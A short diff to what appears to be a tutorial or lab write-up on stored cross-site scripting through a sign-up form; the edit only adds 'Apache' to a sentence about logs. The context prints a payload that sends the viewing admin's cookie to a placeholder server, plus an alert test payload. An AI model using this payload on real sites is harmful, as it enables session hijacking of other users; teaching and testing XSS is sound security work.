@@ -42,7 +42,7 @@ Enter this code into the address field on the SignUp page;
 
 ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
 
-When the admin logs in and takes a look at the sign-ups, his session-id should be written to the logs of “yourserver”.<br> 
+When the admin logs in and takes a look at the sign-ups, his session-id should be written to the Apache logs of “yourserver”.<br> 
 But you can also test with code like this, in any of the fields on the SignUp page; 
 ```<body onload=alert('hello')>```
 
